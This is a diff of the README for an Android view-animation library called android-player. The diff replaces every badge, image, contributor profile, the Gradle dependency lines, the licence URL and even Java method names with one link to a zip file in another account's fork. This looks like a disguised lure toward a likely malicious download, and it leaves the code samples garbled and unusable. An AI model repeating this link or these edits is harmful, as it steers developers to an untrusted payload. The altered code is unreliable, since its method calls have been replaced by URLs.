@@ -1,18 +1,18 @@
 ## android-player
 
-[![Join the chat at https://gitter.im/geftimov/android-player](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/geftimov/android-player?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge) [![Android Arsenal](https://img.shields.io/badge/Android%20Arsenal-android--player-brightgreen.svg?style=flat)](http://android-arsenal.com/details/1/1760) [![Maven Central](https://maven-badges.herokuapp.com/maven-central/com.eftimoff/androidplayer/badge.svg?style=flat)](https://maven-badges.herokuapp.com/maven-central/com.eftimoff/androidplayer)
+[![Join the chat at https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip%https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip) [![Android Arsenal](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip%https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip) [![Maven Central](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)
 
 Animations when entering Actvity or Fragment made easy.</br>
 Backward compatibility API 1.
 
 #### You have created beautiful UI , but it is boring
 
-![svg](https://github.com/geftimov/android-player/blob/master/art/playerPhoto.png) 
+![svg](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip) 
 
 ###### Run the player and you will can create beautiful transitions </br>for your views when entering Activity / Fragment.</br>Put in your onCreate() for Activity or onViewCreated() for Fragment.
 
 ```java
-Player.init().
+https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip().
 	animate(headerAction).
 	then().
 	animate(fabAction).
@@ -23,24 +23,24 @@ Player.init().
 
 #### Result
 
-![svg](https://github.com/geftimov/android-player/blob/master/art/sample_one.gif)
+![svg](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)
 
 #### Actions
 
 ```java
-	final PropertyAction fabAction = PropertyAction.newPropertyAction(activityMainPinkFab).
+	final PropertyAction fabAction = https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip(activityMainPinkFab).
 			scaleX(0).
 			scaleY(0).
 			duration(750).
 			interpolator(new AccelerateDecelerateInterpolator()).
 			build();
-	final PropertyAction headerAction = PropertyAction.newPropertyAction(activityMainheaderLayout).
+	final PropertyAction headerAction = https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip(activityMainheaderLayout).
 			interpolator(new DecelerateInterpolator()).
 			translationY(-200).
 			duration(550).
 			alpha(0.4f).
 			build();
-	final PropertyAction bottomAction = PropertyAction.newPropertyAction(activityMainMobileNumberLayout).
+	final PropertyAction bottomAction = https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip(activityMainMobileNumberLayout).
 			translationY(500).
 			duration(550).
 			alpha(0f).
@@ -59,8 +59,8 @@ To make custom Action , just extend the BaseAction and implement the two abstrac
 
 #### Contributors
 
-[Martin Vitanov](https://github.com/martinVitanov "Martin Vitanov") <br />
-[Georgi Eftimov](https://github.com/geftimov "Georgi Eftimov")
+[Martin Vitanov](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip "Martin Vitanov") <br />
+[Georgi Eftimov](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip "Georgi Eftimov")
 
 #### Changelog
 
@@ -69,13 +69,13 @@ To make custom Action , just extend the BaseAction and implement the two abstrac
 ##### Download
 ```groovy
 dependencies {
-	compile 'com.eftimoff:androidplayer:1.0.3@aar'
-	compile 'com.nineoldandroids:library:2.4.0'
+	compile 'https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip'
+	compile 'https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip'
 }
 ```
 ##### Make your animations how ever you want	
 	
-![svg](https://github.com/geftimov/android-player/blob/master/art/sample_two.gif) ![svg](https://github.com/geftimov/android-player/blob/master/art/sample_three.gif) ![svg](https://github.com/geftimov/android-player/blob/master/art/sample_four.gif)
+![svg](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip) ![svg](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip) ![svg](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)
 
 
 ## Licence
@@ -86,7 +86,7 @@ dependencies {
     you may not use this file except in compliance with the License.
     You may obtain a copy of the License at
 
-       http://www.apache.org/licenses/LICENSE-2.0
+       https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip
 
     Unless required by applicable law or agreed to in writing, software
     distributed under the License is distributed on an "AS IS" BASIS,
